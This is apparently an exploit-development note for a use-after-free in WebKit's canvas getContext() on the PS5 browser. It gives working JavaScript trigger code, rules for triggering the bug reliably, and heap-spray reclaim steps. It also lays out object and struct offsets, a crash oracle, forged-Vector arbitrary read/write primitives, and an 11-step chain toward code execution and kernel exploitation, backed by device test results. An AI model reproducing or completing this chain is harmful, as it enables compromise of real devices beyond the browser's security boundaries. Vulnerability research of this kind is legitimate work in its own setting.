# CVE-2026-43720 -- Canvas getContext() Reentrant UAF

**Status:** CONFIRMED on PS5 14.10. Same-type reclaim + bidirectional R/W WORKING.

**Fix:** Commit 2693828e8d73 (2026-06-29). Not present in WK-1400.

## The Bug

`HTMLCanvasElement::getContext()` reads dictionary options via JS property getters BEFORE
setting the new context. A re-entrant getter creates a 2d context; the outer call then
replaces it with bitmaprenderer, freeing the 2d context while its JS wrapper survives.

Source: `HTMLCanvasElement.cpp`, lines 226 (m_context check) and 268 (IDL dictionary
conversion with JS getter callbacks).

### Trigger (bitmaprenderer outer + 2d inner)

```javascript
var innerCtx;
var canvas = document.createElement('canvas');
canvas.width = 1; canvas.height = 1;
var opts = {};
Object.defineProperty(opts, 'alpha', {
  get: function() {
    innerCtx = canvas.getContext('2d');
    return true;
  }
});
canvas.getContext('bitmaprenderer', opts);
// innerCtx is now a dangling reference to freed 768-byte memory
```

**Critical rules:**
- Outer MUST be `bitmaprenderer` (80B, different size class from 2d's 768B)
- Inner MUST be `2d`
- MUST use `Object.defineProperty`, NOT Proxy
- NEVER trigger UAF more than once per page load (double-deref = heap corruption)

### Why bitmaprenderer?

The bitmaprenderer context object is ~80 bytes vs Canvas2D's ~768 bytes. Different size
classes prevent the outer context from accidentally reclaiming the inner context's freed
slot during the same `getContext()` call.

## IsoHeap is OFF on PS5

`WTF_MAKE_ISO_ALLOCATED` compiles to standard FastMalloc on FreeBSD/PlayStation.
`BPLATFORM(PLAYSTATION)` at BPlatform.h:341 disables IsoHeap. Gigacage also disabled.
All WebCore objects live in the same heap.

Confirmed by:
- BPlatform.h:341 source analysis
- Synacktiv PS5 exploitation writeup
- CSSFontFace exploitation research (AB shares heap)

## Same-Type Reclaim (V573)

After triggering the UAF, spray 500 new Canvas2D contexts. One reclaims the freed
768-byte slot. `innerCtx` and `sprayCtxs[N].ctx` now alias the same live C++ object.

Device evidence:
- V573: Alias at index 9/11, bidirectional R/W confirmed
- V562: ALL 12 Canvas2D APIs work through alias (clean complete run)
- V630: Comprehensive re-confirmation, alias at index 11

## Confirmed Primitives

| API | Primitive | Type |
|-----|-----------|------|
| lineWidth | Float64 R/W at State+48 | number |
| miterLimit | Float64 R/W at State+64 | number |
| globalAlpha | Float64 R/W at State+0 | number |
| fillStyle | Color R/W at State+16 | string |
| strokeStyle | Color R/W at State+32 | string |
| font | Font string R/W at State+224 | string |
| setLineDash / getLineDash | 500-double array round-trip | Float64Array |
| getTransform | DOMMatrix read at State+112 | object |
| save / restore | 3-level state stack cycle | - |
| createPattern | Pattern from HTMLCanvasElement | object |
| measureText | TextMetrics object read | object |

## Crash Oracle

Forging `m_stateStack` (Vector at context offset +112) in an aliased ArrayBuffer:

1. Set `m_buffer` (ptr at AB+112) to target address
2. Set `m_size` (u32 at AB+120) to 2
3. Read `lineWidth` through dangling `innerCtx` -> reads float64 at `target + 48`
4. If target page is mapped: returns 8 bytes of data
5. If target page is unmapped: SIGSEGV, PS5 browser reloads

This gives a binary "mapped / not mapped" oracle plus 8-byte data reads from arbitrary
addresses.

## Process-memory disclosure (V704/V705)

A hidden-default APNG whose first animation frame is narrower than the IHDR canvas
causes `PNGImageDecoder::rowAvailable` to read beyond the libpng row. Canvas
`getImageData` returns the affected pixels. Exact controls and two device loads
confirm adjacent process bytes and aligned heap-shaped values. The page cannot
choose the source address, so this is not an arbitrary read or an ASLR bypass by
itself. See [the device report](../reports/APNG_HIDDEN_DEFAULT_DISCLOSURE_1410.md).

## Exploitation Chain

1. **UAF trigger** -> `innerCtx` points to freed 768B slot
2. **Same-type reclaim** -> spray ctx aliases `innerCtx`
3. **Info leak** -> V704/V705 provide a bounded adjacent-row disclosure; a chosen-address read is still missing
4. **State buffer grow** -> 8x save() = 6400B out-of-line buffer
5. **State buffer free** -> BMR trigger frees inner ctx + state buffer
6. **AB reclaim state buffer** -> 200x ArrayBuffer(6400) sprayed
7. **Forge lineDash Vector** -> set m_buffer=target, m_size=N in AB
8. **Arbitrary read** -> getLineDash through alias reads from m_buffer
9. **Arbitrary write** -> setLineDash writes in-place when capacity >= N
10. **Code exec** -> vtable hijack or startOfStructureHeap overwrite (config unfrozen)
11. **Kernel** -> FreeBSD 11 kernel CVEs (needs browser code exec first)

## Key Offsets (CanvasRenderingContext2D, sizeof ~768B)

| Offset | Field | Notes |
|--------|-------|-------|
| +0 | vtable | NO vtable dispatch in lineWidth path |
| +32 | m_canvas | Ref<HTMLCanvasElement> -- GC reads this |
| +40 | CanvasPath vptr | |
| +48 | m_path | |
| +112 | m_stateStack | Vector<State>: m_buffer(ptr) + m_size(u32) + m_capacity(u32) |
| +128 | inline buffer | First State struct starts here |
| +592 | m_unrealizedSaveCount | |

## State Struct Layout (sizeof = 400B)

| Offset | Field | Type | Read via |
|--------|-------|------|----------|
| +0 | globalAlpha | double | `globalAlpha` |
| +16 | fillStyle | CanvasStyle (16B) | `fillStyle` |
| +32 | strokeStyle | CanvasStyle (16B) | `strokeStyle` |
| +48 | lineWidth | double | `lineWidth` |
| +64 | miterLimit | double | `miterLimit` |
| +88 | shadowBlur | double | `shadowBlur` |
| +112 | transform | AffineTransform (48B) | `getTransform` |
| +168 | lineDash | Vector<double> | `getLineDash` / `setLineDash` |
| +224 | FontProxy vptr | pointer | `font` (string only) |

## DAZ Constraint

PS5 has DAZ (Denormals Are Zero) enabled. All Canvas2D float64 channels flush
denormals to 0.0. Pointer values read as float64 may lose low bits. Must use
BigUint64Array for full 64-bit pointer reads once data is in an ArrayBuffer.

## Device Evidence Summary

| Probe | Purpose | Result |
|-------|---------|--------|
| V460/V461 | Re-entry confirmed | UAF trigger works |
| V527/V527b | AB reclaim discriminator | lineWidth=9999.99 readback |
| V548-V550 | Alias confirmation | Full state R/W via aliased pair |
| V562 | All 12 APIs through alias | Clean complete run |
| V573 | Same-type reclaim diagnostic | CONFIRMED: bidirectional R/W |
| V589 | BMR trigger validation | uaf-ok: inner=OK |
| V630 | Full 12-API alias diagnostic | ALL APIs pass, alias at idx=11 |
| V704/V705 | APNG hidden-default row disclosure | CONFIRMED: exact controls, bounded process bytes; not `read64(address)` |
